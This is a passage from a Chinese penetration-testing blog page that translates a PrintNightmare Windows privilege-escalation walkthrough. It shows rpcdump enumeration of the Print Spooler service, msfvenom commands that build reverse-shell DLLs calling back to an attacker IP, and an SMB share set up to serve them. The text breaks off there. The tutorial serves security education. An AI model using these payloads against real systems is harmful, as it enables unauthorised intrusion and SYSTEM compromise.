<!doctype html>
<html lang="zh" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-渗透/Windows 提权/Windows 提权-PrintNightmare" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Windows 提权-PrintNightmare | 扛枪的书生</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://kqdssheng.github.io/web/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare"><meta data-rh="true" property="og:locale" content="zh"><meta data-rh="true" name="docusaurus_locale" content="zh"><meta data-rh="true" name="docsearch:language" content="zh"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Windows 提权-PrintNightmare | 扛枪的书生"><meta data-rh="true" name="description" content="本文通过 Google 翻译 PrintNightmare – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><meta data-rh="true" property="og:description" content="本文通过 Google 翻译 PrintNightmare – Windows Privilege Escalation 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。"><link data-rh="true" rel="icon" href="/web/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare" hreflang="zh"><link data-rh="true" rel="alternate" href="https://kqdssheng.github.io/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://SPYLCPE3W9-dsn.algolia.net" crossorigin="anonymous"><link rel="alternate" type="application/rss+xml" href="/web/blog/rss.xml" title="扛枪的书生 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/web/blog/atom.xml" title="扛枪的书生 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="扛枪的书生" href="/web/opensearch.xml"><link rel="stylesheet" href="/web/assets/css/styles.3453dfb7.css">
<script src="/web/assets/js/runtime~main.3e5c23bd.js" defer="defer"></script>
<script src="/web/assets/js/main.eab2f939.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/web/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="navbar navbar--fixed-top navbarHideable_m1mJ navbar--primary"><div class="navbar__inner"><div class="navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/web/"><div class="navbar__logo"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/web/docs/category/️渗透">文章</a><a class="navbar__item navbar__link" href="/web/blog">说说</a><div class="navbar__item dropdown dropdown--hoverable"><a href="#" aria-haspopup="true" aria-expanded="false" role="button" class="navbar__link">其它</a><ul class="dropdown__menu"><li><a href="https://www.douban.com/doulist/154252035/" target="_blank" rel="noopener noreferrer" class="dropdown__link">豆瓣<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.zhihu.com/people/KqdsshenG" target="_blank" rel="noopener noreferrer" class="dropdown__link">知乎<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://www.cnblogs.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">博客园<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li><li><a href="https://github.com/kqdssheng" target="_blank" rel="noopener noreferrer" class="dropdown__link">GitHub<svg width="12" height="12" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="navbar__items navbar__items--right"><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="切换浅色/暗黑模式（当前为浅色模式）" aria-label="切换浅色/暗黑模式（当前为浅色模式）" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd sidebarWithHideableNavbar_wUlq"><a tabindex="-1" class="sidebarLogo_isFc" href="/web/"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/web/img/logo.svg" alt="kqdssheng" class="themedComponent_mlkZ themedComponent--dark_xIcU"></a><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/web/docs/category/️渗透">🕵️渗透</a><button aria-label="折叠侧边栏分类 &#x27;🕵️渗透&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/linux-提权">Linux 提权</a><button aria-label="展开侧边栏分类 &#x27;Linux 提权&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/web/docs/category/windows-提权">Windows 提权</a><button aria-label="折叠侧边栏分类 &#x27;Windows 提权&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-MSSQL">Windows 提权-MSSQL</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-PrintNightmare">Windows 提权-PrintNightmare</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-RunAs">Windows 提权-RunAs</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeBackupPrivilege 特权">Windows 提权-SeBackupPrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-SeImpersonatePrivilege 特权">Windows 提权-SeImpersonatePrivilege 特权</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-UAC 绕过">Windows 提权-UAC 绕过</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-不安全的 GUI 程序">Windows 提权-不安全的 GUI 程序</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_1">Windows 提权-内核利用_1</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-内核利用_2">Windows 提权-内核利用_2</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-密码搜寻">Windows 提权-密码搜寻</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-手工枚举">Windows 提权-手工枚举</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_DLL 劫持">Windows 提权-服务_DLL 劫持</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱文件_目录权限">Windows 提权-服务_弱文件_目录权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱服务权限">Windows 提权-服务_弱服务权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_弱注册表权限">Windows 提权-服务_弱注册表权限</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/web/docs/渗透/Windows 提权/Windows 提权-服务_未引用的服务路径">Windows 提权-服务_未引用的服务路径</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/web/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/linux">🐧Linux</a><button aria-label="展开侧边栏分类 &#x27;🐧Linux&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/windows">💻Windows</a><button aria-label="展开侧边栏分类 &#x27;💻Windows&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/杂项-1">📦杂项</a><button aria-label="展开侧边栏分类 &#x27;📦杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/web/docs/category/gpt-问答">🤖GPT 问答</a><button aria-label="展开侧边栏分类 &#x27;🤖GPT 问答&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/web/docs/">🛠️软件百宝箱</a></li></ul></nav><button type="button" title="收起侧边栏" aria-label="收起侧边栏" class="button button--secondary button--outline collapseSidebarButton_PEFL"><svg width="20" height="20" aria-hidden="true" class="collapseSidebarButtonIcon_kv0_"><g fill="#7a7a7a"><path d="M9.992 10.023c0 .2-.062.399-.172.547l-4.996 7.492a.982.982 0 01-.828.454H1c-.55 0-1-.453-1-1 0-.2.059-.403.168-.551l4.629-6.942L.168 3.078A.939.939 0 010 2.528c0-.548.45-.997 1-.997h2.996c.352 0 .649.18.828.45L9.82 9.472c.11.148.172.347.172.55zm0 0"></path><path d="M19.98 10.023c0 .2-.058.399-.168.547l-4.996 7.492a.987.987 0 01-.828.454h-3c-.547 0-.996-.453-.996-1 0-.2.059-.403.168-.551l4.625-6.942-4.625-6.945a.939.939 0 01-.168-.55 1 1 0 01.996-.997h3c.348 0 .649.18.828.45l4.996 7.492c.11.148.168.347.168.55zm0 0"></path></g></svg></button></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/web/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/️渗透"><span itemprop="name">🕵️渗透</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/web/docs/category/windows-提权"><span itemprop="name">Windows 提权</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Windows 提权-PrintNightmare</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>Windows 提权-PrintNightmare</h1></header><blockquote>
<p>本文通过 Google 翻译 <a href="https://juggernaut-sec.com/printnightmare/" target="_blank" rel="noopener noreferrer">PrintNightmare – Windows Privilege Escalation</a> 这篇文章所产生，本人仅是对机器翻译中部分表达别扭的字词进行了校正及个别注释补充。</p>
</blockquote>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="导航">导航<a href="#导航" class="hash-link" aria-label="导航的直接链接" title="导航的直接链接">​</a></h2>
<ul>
<li><a href="#id0">0 前言</a></li>
<li><a href="#id1">1 CVE-2021-34527 – PrintNightmare RCE（准 远程代码执行）</a>
<ul>
<li><a href="#id1.1">1.1 远程枚举 Print Spooler 服务</a></li>
<li><a href="#id1.2">1.2 行刑前的准备</a></li>
<li><a href="#id1.3">1.3 利用 CVE-2021-1675.py</a></li>
</ul>
</li>
<li><a href="#id2">2 CVE-2021-1675 – PrintNightmare LPE（本地权限提升）</a>
<ul>
<li><a href="#id2.1">2.1 本地枚举 Print Spooler 服务</a></li>
<li><a href="#id2.2">2.2 利用 SharpPrintNightmare.exe</a></li>
<li><a href="#id2.3">2.3 利用 CVE-2021-1675.ps1</a></li>
</ul>
</li>
</ul>
<hr>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="0前言"><strong><div id="id0">0、前言</div></strong><a href="#0前言" class="hash-link" aria-label="0前言的直接链接" title="0前言的直接链接">​</a></h2>
<p>在这篇文章中，我们将介绍被称为 PrintNightmare（打印梦魇）的权限提升技术，该技术是针对 <strong>Windows 打印后台处理</strong> 服务里面存在的一个漏洞进行的利用。下面，我们将演示怎样在<strong>远程</strong>和<strong>本地</strong>去列举打印后台处理服务，并且还会展示怎样使用三种不同的工具来利用这个服务。</p>
<p>PrintNightmare 是影响 Windows 操作系统的严重安全漏洞，它有两种变体，一种允许远程代码执行（CVE-2021-34527），另一种导致权限提升（CVE-2021-1675）。</p>
<blockquote>
<p>注：PrintNightmare 漏洞影响着 Windows 几乎所有的版本。Windows 7、Windows 8.1、Windows 10，Windows Server 2008、2012、2016、2019、2022，甚至 Windows 11 也受到一定影响。</p>
</blockquote>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="1cve-2021-34527--printnightmare-rce准-远程代码执行"><strong><div id="id1">1、CVE-2021-34527 – PrintNightmare RCE（准 远程代码执行）</div></strong><a href="#1cve-2021-34527--printnightmare-rce准-远程代码执行" class="hash-link" aria-label="1cve-2021-34527--printnightmare-rce准-远程代码执行的直接链接" title="1cve-2021-34527--printnightmare-rce准-远程代码执行的直接链接">​</a></h2>
<p>首先，我们将使用 <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreferrer">Impacket</a> 套件中的 rpcdump.py 工具来远程枚举目标机器的打印服务，一旦确认该服务正在运行，就使用 <a href="https://github.com/cube0x0/CVE-2021-1675" target="_blank" rel="noopener noreferrer">CVE-2021-1675.py</a> 脚本来利用该服务。</p>
<p>CVE-2021-1675.py 脚本会配合攻击者机器上共享的恶意 DLL 文件，让 DLL 文件直接在受害者机器上执行，一旦 DLL 被执行，它将为我们提供一个 SYSTEM shell！</p>
<blockquote>
<p>CVE-2021-1675.py 的 GitHub 仓库中还包含此脚本的 CSharp 版本：SharpPrintNightmare，而这个将在后文使用它。</p>
</blockquote>
<p>使用此 RCE 漏洞的<strong>前提条件</strong>是：需要一个标准用户的凭证（密码或 NTLM hash） 。尽管这也被视作是 RCE 漏洞，但它其实主要还是一个权限提升漏洞，因为需要提供标准用户凭证，并且该标准用户的权限最终会被提升到 SYSTEM 级别。</p>
<blockquote>
<p>在此示例中，假设我们通过暴力攻击获取到了用户 cmarko 的凭据。</p>
</blockquote>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="11远程枚举-print-spooler-服务"><strong><div id="id1.1">1.1、远程枚举 Print Spooler 服务</div></strong><a href="#11远程枚举-print-spooler-服务" class="hash-link" aria-label="11远程枚举-print-spooler-服务的直接链接" title="11远程枚举-print-spooler-服务的直接链接">​</a></h4>
<p>要扫描目标计算机以查找 print spooler 服务是否正在运行，请使用以下命令：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">rpcdump.py @172.16.1.50 | egrep &#x27;MS-RPRN|MS-PAR&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823664-579993839-6a5183d4d773e4d99c7292f2fdacde50.png" width="514" height="83" class="img_ev3q"></p>
<p>如果输出有结果，那么它应该是脆弱的！</p>
<p>现在我们知道打印服务正在目标机器上运行着，此时，还需要使用 msfvenom 制作一个恶意 DLL 以供 CVE-2021-1675.py 使用。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="12行刑前的准备"><strong><div id="id1.2">1.2、行刑前的准备</div></strong><a href="#12行刑前的准备" class="hash-link" aria-label="12行刑前的准备的直接链接" title="12行刑前的准备的直接链接">​</a></h4>
<p>由于没有好的方法能够让我们远程对目标机器进行 100% 的指纹识别，以确定操作系统版本和架构。因此我们可以为这个漏洞同时制作 64 位和 32 位 DLL。这样，如果其中一个不起作用，我们就可以测试另一个。</p>
<p>由于目标很有可能是 64 位的架构，因此首先使用以下命令创建 64 位的 DLL：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/x64/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x64 --platform Windows -f dll -o nightmare64.dll</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>接着制作一个 32 位的 DLL，为 64 位 DLL 失败时做好准备：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msfvenom -p windows/shell_reverse_tcp LHOST=172.16.1.30 LPORT=443 -a x86 --platform Windows -f dll -o nightmare86.dll</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824046-175763318-3d33c4108a8b151ea6fe87d66d19ff07.png" width="843" height="285" class="img_ev3q"></p>
<p>接下来，我们把两个 DLL 都放在同一个目录中，然后为此目录设置 SMB 共享，可使用以下命令：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">impacket-smbserver share $(pwd) -smb2support</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 